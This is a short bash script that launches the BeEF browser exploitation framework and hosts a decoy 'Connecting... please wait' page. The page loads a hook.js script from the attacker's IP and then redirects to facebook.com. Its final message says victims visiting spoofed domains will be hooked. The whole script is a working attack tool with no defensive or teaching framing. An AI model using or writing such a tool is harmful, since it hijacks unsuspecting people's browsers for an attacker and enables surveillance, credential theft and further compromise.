#!/bin/bash

# beef-launcher.sh
# Launch BeEF, host a redirector page that hooks the browser then redirects to a real site

BEEF_PORT=3000
REDIRECT_PORT=80
ATTACKER_IP=$(hostname -I | awk '{print $1}')
HOOK_URL="http://$ATTACKER_IP:$BEEF_PORT/hook.js"
REAL_SITE="http://facebook.com"

echo "[*] Starting BeEF at $HOOK_URL ..."
nohup beef-xss > /dev/null 2>&1 &
sleep 10

# Make redirector page with BeEF hook
WEB_ROOT="/tmp/beef_hook_page"
mkdir -p "$WEB_ROOT"
cat <<EOF > "$WEB_ROOT/index.html"
<!DOCTYPE html>
<html>
  <head>
    <title>Loading...</title>
    <script src="$HOOK_URL"></script>
    <script>
      setTimeout(function() {
        window.location.href = "$REAL_SITE";
      }, 1000);
    </script>
  </head>
  <body>
    <p>Connecting... please wait</p>
  </body>
</html>
EOF

# Start HTTP server on port 80
cd "$WEB_ROOT"
echo "[*] Hosting redirector page on port 80"
sudo python3 -m http.server 80 > /dev/null 2>&1 &
echo "[+] Done: Victims visiting spoofed domains will be hooked and redirected."
